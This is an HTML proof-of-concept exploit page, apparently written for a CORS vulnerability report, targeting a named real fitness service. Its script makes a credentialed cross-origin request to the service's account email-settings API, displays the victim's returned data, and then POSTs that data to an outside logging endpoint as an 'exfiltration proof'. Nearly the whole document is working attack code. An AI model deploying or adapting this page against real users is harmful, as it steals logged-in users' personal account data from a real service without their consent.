<!doctype html>

<html lang="en">
<head>
  <meta charset="utf-8" />
  <meta name="viewport" content="width=device-width,initial-scale=1" />
  <title>CORS Exploit PoC</title>
  <style>
    body {
      margin: 0;
      font-family: Arial, sans-serif;
      background: #0b1020;
      color: #e8ecf6;
      padding: 20px;
    }
    .card {
      max-width: 900px;
      margin: auto;
      background: #11182d;
      padding: 20px;
      border-radius: 12px;
      border: 1px solid #25304f;
    }
    h1 { margin-bottom: 10px; }
    button {
      margin-top: 15px;
      padding: 12px;
      width: 100%;
      border: none;
      border-radius: 8px;
      background: #4f7cff;
      color: white;
      font-weight: bold;
      cursor: pointer;
    }
    textarea {
      width: 100%;
      margin-top: 15px;
      min-height: 200px;
      background: #0c1326;
      color: #e8ecf6;
      border: 1px solid #25304f;
      border-radius: 8px;
      padding: 10px;
      font-family: monospace;
    }
    .info {
      margin-top: 10px;
      font-size: 14px;
      color: #9ca7c7;
    }
  </style>
</head>
<body>

<div class="card">
  <h1>CORS Exploit PoC</h1>

  <div class="info">
    This page performs a cross-origin authenticated request to MyFitnessPal
    and displays sensitive user data if the vulnerability exists.
  </div>

<button onclick="runExploit()">Run Exploit</button>

  <textarea id="output" placeholder="Sensitive data will appear here..."></textarea>

</div>

<script>
async function runExploit() {
  const output = document.getElementById("output");
  output.value = "Running exploit...\n";

  try {
    const res = await fetch("https://www.myfitnesspal.com/api/services/account/email_settings", {
      method: "GET",
      credentials: "include"
    });

    const data = await res.text();

    output.value = data;

    // OPTIONAL exfiltration proof (safe dummy endpoint)
    fetch("https://example.com/log", {
      method: "POST",
      body: data
    });

  } catch (e) {
    output.value = "Exploit failed:\n" + e;
  }
}
</script>

</body>
</html>
